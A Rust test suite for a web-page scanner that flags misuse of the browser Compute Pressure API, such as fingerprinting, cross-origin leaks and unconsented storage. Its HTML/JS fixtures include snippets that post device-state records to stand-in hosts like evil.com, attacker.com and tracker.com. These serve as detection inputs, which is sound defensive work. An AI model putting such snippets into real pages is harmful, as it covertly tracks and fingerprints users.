use crate::compute_pressure_audit::*;

#[test]
fn no_pressure_no_issues() {
    assert!(analyze_compute_pressure("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api() {
    let body = r#"<script>const observer = new PressureObserver(callback);</script>"#;
    let issues = analyze_compute_pressure(body);
    assert!(issues.contains(&ComputePressureIssue::ApiDetected));
}

#[test]
fn detects_state_exfiltration() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            fetch("/track?state=" + records[0].state);
        });
    </script>"#;
    let issues = analyze_compute_pressure(body);
    assert!(issues.contains(&ComputePressureIssue::StateExfiltration));
}

#[test]
fn no_exfil_without_fetch() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            console.log(records[0].state);
        });
    </script>"#;
    let issues = analyze_compute_pressure(body);
    assert!(!issues.contains(&ComputePressureIssue::StateExfiltration));
}

#[test]
fn detects_cpu_fingerprinting() {
    let body = r#"<script>
        const observer = new PressureObserver(callback);
        const cores = navigator.hardwareConcurrency;
    </script>"#;
    let issues = analyze_compute_pressure(body);
    assert!(issues.contains(&ComputePressureIssue::CpuFingerprinting));
}

#[test]
fn detects_cross_origin_leak() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            parent.postMessage(records[0].state, "*");
        });
    </script>"#;
    let issues = analyze_compute_pressure(body);
    assert!(issues.contains(&ComputePressureIssue::CrossOriginLeak));
}

#[test]
fn detects_continuous_observing() {
    let body = r#"<script>
        const observer = new PressureObserver(callback);
        observer.observe("cpu");
    </script>"#;
    let issues = analyze_compute_pressure(body);
    assert!(issues.contains(&ComputePressureIssue::ContinuousObserving));
}

#[test]
fn no_continuous_with_disconnect() {
    let body = r#"<script>
        const observer = new PressureObserver(callback);
        observer.observe("cpu");
        setTimeout(() => observer.disconnect(), 5000);
    </script>"#;
    let issues = analyze_compute_pressure(body);
    assert!(!issues.contains(&ComputePressureIssue::ContinuousObserving));
}

#[test]
fn severity_exfiltration_highest() {
    assert_eq!(
        compute_pressure_severity(&ComputePressureIssue::StateExfiltration),
        6.5
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(
        compute_pressure_severity(&ComputePressureIssue::ApiDetected),
        3.0
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        ComputePressureIssue::ApiDetected,
        ComputePressureIssue::CpuFingerprinting,
    ];
    let mut seq = 0;
    let ops = compute_pressure_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(
        ComputePressureIssue::ApiDetected.to_string(),
        "api_detected"
    );
    assert_eq!(
        ComputePressureIssue::StateExfiltration.to_string(),
        "state_exfiltration"
    );
    assert_eq!(
        ComputePressureIssue::CpuFingerprinting.to_string(),
        "cpu_fingerprinting"
    );
    assert_eq!(
        ComputePressureIssue::CrossOriginLeak.to_string(),
        "cross_origin_leak"
    );
    assert_eq!(
        ComputePressureIssue::ContinuousObserving.to_string(),
        "continuous_observing"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_compute_pressure("").is_empty());
}

#[test]
fn security_detects_observer_without_policy() {
    let body =
        r#"<script>const observer = new PressureObserver(cb); observer.observe("cpu");</script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(issues.iter().any(|i| matches!(
        i,
        ComputePressureSecurityIssue::ObserverWithoutFeaturePolicy
    )));
}

#[test]
fn security_no_observer_without_policy_when_policy_present() {
    let body = r#"<meta http-equiv="Permissions-Policy" content="compute-pressure=(self)">
    <script>const observer = new PressureObserver(cb);</script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(!issues.iter().any(|i| matches!(
        i,
        ComputePressureSecurityIssue::ObserverWithoutFeaturePolicy
    )));
}

#[test]
fn security_detects_data_collection_without_consent() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            localStorage.setItem("pressure", JSON.stringify(records));
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(issues.iter().any(|i| matches!(
        i,
        ComputePressureSecurityIssue::DataCollectionWithoutConsent
    )));
}

#[test]
fn security_no_data_collection_without_consent_when_consent_present() {
    let body = r#"<script>
        if (userConsent) {
            const observer = new PressureObserver(records => {
                localStorage.setItem("pressure", JSON.stringify(records));
            });
        }
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(!issues.iter().any(|i| matches!(
        i,
        ComputePressureSecurityIssue::DataCollectionWithoutConsent
    )));
}

#[test]
fn security_detects_timing_correlation() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            const timestamp = Date.now();
            console.log(records[0].state, timestamp);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::TimingCorrelation))
    );
}

#[test]
fn security_no_timing_correlation_without_timestamp() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            console.log(records[0].state);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::TimingCorrelation))
    );
}

#[test]
fn security_detects_cross_origin_pressure_leak() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            window.parent.postMessage({ pressure: records[0].state }, "*");
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::CrossOriginPressureLeak))
    );
}

#[test]
fn security_no_cross_origin_leak_without_postmessage() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            console.log(records[0].state);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::CrossOriginPressureLeak))
    );
}

#[test]
fn security_detects_worker_based_collection() {
    let body = r#"<script>
        const worker = new Worker("pressure-worker.js");
        // In worker file:
        const observer = new PressureObserver(records => {
            postMessage(records);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::WorkerBasedCollection))
    );
}

#[test]
fn security_no_worker_based_collection_without_worker() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            console.log(records);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::WorkerBasedCollection))
    );
}

#[test]
fn security_detects_persistent_storage() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            localStorage.setItem("cpu-pressure", records[0].state);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::PersistentStorage))
    );
}

#[test]
fn security_detects_persistent_storage_indexeddb() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            const db = await indexedDB.open("pressure-db");
            db.add({ state: records[0].state });
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::PersistentStorage))
    );
}

#[test]
fn security_no_persistent_storage_without_storage_api() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            console.log(records[0].state);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::PersistentStorage))
    );
}

#[test]
fn security_detects_high_frequency_polling() {
    let body = r#"<script>
        const observer = new PressureObserver(callback, { sampleInterval: 100 });
        observer.observe("cpu");
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::HighFrequencyPolling))
    );
}

#[test]
fn security_detects_high_frequency_polling_50ms() {
    let body = r#"<script>
        const observer = new PressureObserver(callback, { sampleInterval: 50 });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::HighFrequencyPolling))
    );
}

#[test]
fn security_no_high_frequency_polling_normal_interval() {
    let body = r#"<script>
        const observer = new PressureObserver(callback, { sampleInterval: 1000 });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::HighFrequencyPolling))
    );
}

#[test]
fn security_detects_multi_source_correlation() {
    let body = r#"<script>
        const cpuObserver = new PressureObserver(cpuCallback);
        cpuObserver.observe("cpu");
        const thermalObserver = new PressureObserver(thermalCallback);
        thermalObserver.observe("thermals");
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::MultiSourceCorrelation))
    );
}

#[test]
fn security_no_multi_source_correlation_single_source() {
    let body = r#"<script>
        const observer = new PressureObserver(callback);
        observer.observe("cpu");
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::MultiSourceCorrelation))
    );
}

#[test]
fn security_detects_battery_correlation() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            navigator.getBattery().then(battery => {
                console.log(records[0].state, battery.level);
            });
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::BatteryCorrelation))
    );
}

#[test]
fn security_no_battery_correlation_without_battery_api() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            console.log(records[0].state);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::BatteryCorrelation))
    );
}

#[test]
fn security_detects_unencrypted_transmission() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            fetch("http://evil.com/track", {
                method: "POST",
                body: JSON.stringify(records)
            });
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::UnencryptedTransmission))
    );
}

#[test]
fn security_no_unencrypted_transmission_with_https() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            fetch("https://api.example.com/track", {
                method: "POST",
                body: JSON.stringify(records)
            });
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::UnencryptedTransmission))
    );
}

#[test]
fn security_multiple_issues_combined() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            const timestamp = Date.now();
            localStorage.setItem("pressure", JSON.stringify({ state: records[0].state, time: timestamp }));
            fetch("http://tracker.com/log", { method: "POST", body: records[0].state });
        }, { sampleInterval: 100 });
        observer.observe("cpu");
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(issues.len() >= 4);
    assert!(issues.iter().any(|i| matches!(
        i,
        ComputePressureSecurityIssue::ObserverWithoutFeaturePolicy
    )));
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::TimingCorrelation))
    );
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::PersistentStorage))
    );
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::UnencryptedTransmission))
    );
}

#[test]
fn security_empty_body_no_issues() {
    let issues = analyze_compute_pressure_security("");
    assert!(issues.is_empty());
}

#[test]
fn security_no_observer_no_issues() {
    let body = r#"<script>
        console.log("Hello world");
        fetch("http://example.com");
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(issues.is_empty());
}

#[test]
fn security_partial_match_no_false_positive() {
    let body = r#"<script>
        // This mentions the word pressure but not the API
        const pressure = 100;
        console.log(pressure);
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(issues.is_empty());
}

#[test]
fn security_display_observer_without_feature_policy() {
    assert_eq!(
        ComputePressureSecurityIssue::ObserverWithoutFeaturePolicy.to_string(),
        "observer_without_feature_policy"
    );
}

#[test]
fn security_display_data_collection_without_consent() {
    assert_eq!(
        ComputePressureSecurityIssue::DataCollectionWithoutConsent.to_string(),
        "data_collection_without_consent"
    );
}

#[test]
fn security_display_timing_correlation() {
    assert_eq!(
        ComputePressureSecurityIssue::TimingCorrelation.to_string(),
        "timing_correlation"
    );
}

#[test]
fn security_display_cross_origin_pressure_leak() {
    assert_eq!(
        ComputePressureSecurityIssue::CrossOriginPressureLeak.to_string(),
        "cross_origin_pressure_leak"
    );
}

#[test]
fn security_display_worker_based_collection() {
    assert_eq!(
        ComputePressureSecurityIssue::WorkerBasedCollection.to_string(),
        "worker_based_collection"
    );
}

#[test]
fn security_display_persistent_storage() {
    assert_eq!(
        ComputePressureSecurityIssue::PersistentStorage.to_string(),
        "persistent_storage"
    );
}

#[test]
fn security_display_high_frequency_polling() {
    assert_eq!(
        ComputePressureSecurityIssue::HighFrequencyPolling.to_string(),
        "high_frequency_polling"
    );
}

#[test]
fn security_display_multi_source_correlation() {
    assert_eq!(
        ComputePressureSecurityIssue::MultiSourceCorrelation.to_string(),
        "multi_source_correlation"
    );
}

#[test]
fn security_display_battery_correlation() {
    assert_eq!(
        ComputePressureSecurityIssue::BatteryCorrelation.to_string(),
        "battery_correlation"
    );
}

#[test]
fn security_display_unencrypted_transmission() {
    assert_eq!(
        ComputePressureSecurityIssue::UnencryptedTransmission.to_string(),
        "unencrypted_transmission"
    );
}

#[test]
fn security_severity_unencrypted_transmission_highest() {
    assert_eq!(
        compute_pressure_security_severity(&ComputePressureSecurityIssue::UnencryptedTransmission),
        8.0
    );
}

#[test]
fn security_severity_data_collection_without_consent_high() {
    assert_eq!(
        compute_pressure_security_severity(
            &ComputePressureSecurityIssue::DataCollectionWithoutConsent
        ),
        7.5
    );
}

#[test]
fn security_severity_cross_origin_pressure_leak_high() {
    assert_eq!(
        compute_pressure_security_severity(&ComputePressureSecurityIssue::CrossOriginPressureLeak),
        7.0
    );
}

#[test]
fn security_severity_persistent_storage_medium_high() {
    assert_eq!(
        compute_pressure_security_severity(&ComputePressureSecurityIssue::PersistentStorage),
        6.5
    );
}

#[test]
fn security_severity_battery_correlation_medium() {
    assert_eq!(
        compute_pressure_security_severity(&ComputePressureSecurityIssue::BatteryCorrelation),
        6.0
    );
}

#[test]
fn security_severity_timing_correlation_medium() {
    assert_eq!(
        compute_pressure_security_severity(&ComputePressureSecurityIssue::TimingCorrelation),
        5.5
    );
}

#[test]
fn security_severity_worker_based_collection_medium() {
    assert_eq!(
        compute_pressure_security_severity(&ComputePressureSecurityIssue::WorkerBasedCollection),
        5.0
    );
}

#[test]
fn security_severity_multi_source_correlation_low_medium() {
    assert_eq!(
        compute_pressure_security_severity(&ComputePressureSecurityIssue::MultiSourceCorrelation),
        4.5
    );
}

#[test]
fn security_severity_high_frequency_polling_low_medium() {
    assert_eq!(
        compute_pressure_security_severity(&ComputePressureSecurityIssue::HighFrequencyPolling),
        4.0
    );
}

#[test]
fn security_severity_observer_without_feature_policy_lowest() {
    assert_eq!(
        compute_pressure_security_severity(
            &ComputePressureSecurityIssue::ObserverWithoutFeaturePolicy
        ),
        3.5
    );
}

#[test]
fn security_severity_ordering() {
    let severities = vec![
        compute_pressure_security_severity(&ComputePressureSecurityIssue::UnencryptedTransmission),
        compute_pressure_security_severity(
            &ComputePressureSecurityIssue::DataCollectionWithoutConsent,
        ),
        compute_pressure_security_severity(&ComputePressureSecurityIssue::CrossOriginPressureLeak),
        compute_pressure_security_severity(&ComputePressureSecurityIssue::PersistentStorage),
        compute_pressure_security_severity(&ComputePressureSecurityIssue::BatteryCorrelation),
        compute_pressure_security_severity(&ComputePressureSecurityIssue::TimingCorrelation),
        compute_pressure_security_severity(&ComputePressureSecurityIssue::WorkerBasedCollection),
        compute_pressure_security_severity(&ComputePressureSecurityIssue::MultiSourceCorrelation),
        compute_pressure_security_severity(&ComputePressureSecurityIssue::HighFrequencyPolling),
        compute_pressure_security_severity(
            &ComputePressureSecurityIssue::ObserverWithoutFeaturePolicy,
        ),
    ];
    let mut sorted = severities.clone();
    sorted.sort_by(|a, b| b.partial_cmp(a).unwrap());
    assert_eq!(severities, sorted);
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        ComputePressureSecurityIssue::UnencryptedTransmission,
        ComputePressureSecurityIssue::BatteryCorrelation,
    ];
    let mut seq = 0;
    let ops = compute_pressure_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_empty_issues() {
    let issues = vec![];
    let mut seq = 0;
    let ops = compute_pressure_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 0);
}

#[test]
fn security_to_operations_sequence_increments() {
    let issues = vec![
        ComputePressureSecurityIssue::PersistentStorage,
        ComputePressureSecurityIssue::HighFrequencyPolling,
        ComputePressureSecurityIssue::WorkerBasedCollection,
    ];
    let mut seq = 5;
    let ops = compute_pressure_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 8);
}

#[test]
fn security_detects_service_worker_collection() {
    let body = r#"<script>
        navigator.serviceWorker.register("sw.js");
        // In service worker:
        const observer = new PressureObserver(records => {
            clients.matchAll().then(clients => {
                clients.forEach(client => client.postMessage(records));
            });
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::WorkerBasedCollection))
    );
}

#[test]
fn security_detects_timing_with_performance_now() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            const timestamp = performance.now();
            logActivity(records[0].state, timestamp);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::TimingCorrelation))
    );
}

#[test]
fn security_cross_origin_with_specific_origin() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            window.parent.postMessage(records, "https://attacker.com");
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::CrossOriginPressureLeak))
    );
}

#[test]
fn security_feature_policy_variant_accepted() {
    let body = r#"<meta http-equiv="Feature-Policy" content="compute-pressure=(self)">
    <script>const observer = new PressureObserver(cb);</script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(!issues.iter().any(|i| matches!(
        i,
        ComputePressureSecurityIssue::ObserverWithoutFeaturePolicy
    )));
}

#[test]
fn security_session_storage_triggers_data_collection() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            sessionStorage.setItem("pressure-log", records[0].state);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(issues.iter().any(|i| matches!(
        i,
        ComputePressureSecurityIssue::DataCollectionWithoutConsent
    )));
}

#[test]
fn security_idb_database_triggers_persistent_storage() {
    let body = r#"<script>
        const observer = new PressureObserver(async records => {
            const db = await IDBDatabase.open("pressure");
            db.put(records);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::PersistentStorage))
    );
}

#[test]
fn security_high_frequency_no_space_before_colon() {
    let body = r#"<script>
        const observer = new PressureObserver(cb, {sampleInterval:100});
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::HighFrequencyPolling))
    );
}

#[test]
fn security_multi_source_single_quotes() {
    let body = r#"<script>
        const obs1 = new PressureObserver(cb1);
        obs1.observe('cpu');
        const obs2 = new PressureObserver(cb2);
        obs2.observe('thermals');
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::MultiSourceCorrelation))
    );
}

#[test]
fn security_battery_level_property() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            const level = battery.level;
            correlate(records[0].state, level);
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::BatteryCorrelation))
    );
}

#[test]
fn security_unencrypted_single_quotes() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            fetch('http://tracker.com/log', { body: records[0].state });
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::UnencryptedTransmission))
    );
}

#[test]
fn security_unencrypted_url_property() {
    let body = r#"<script>
        const observer = new PressureObserver(records => {
            fetch({ url: "http://example.com", body: records });
        });
    </script>"#;
    let issues = analyze_compute_pressure_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, ComputePressureSecurityIssue::UnencryptedTransmission))
    );
}
